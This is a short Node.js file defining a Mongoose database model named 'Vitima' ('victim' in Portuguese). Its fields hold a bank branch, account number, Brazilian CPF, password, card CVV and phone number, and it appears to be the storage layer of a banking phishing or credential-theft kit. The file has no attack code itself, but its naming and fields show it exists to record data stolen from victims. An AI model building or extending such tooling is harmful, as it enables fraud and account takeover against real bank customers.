const mongoose = require("mongoose");

const vitima = new mongoose.Schema({
  agencia: String,
  conta: String,
  cpf: String,
  senha: String,
  cvv: String,
  celular: String,
});

module.exports = mongoose.model("Vitima", vitima);
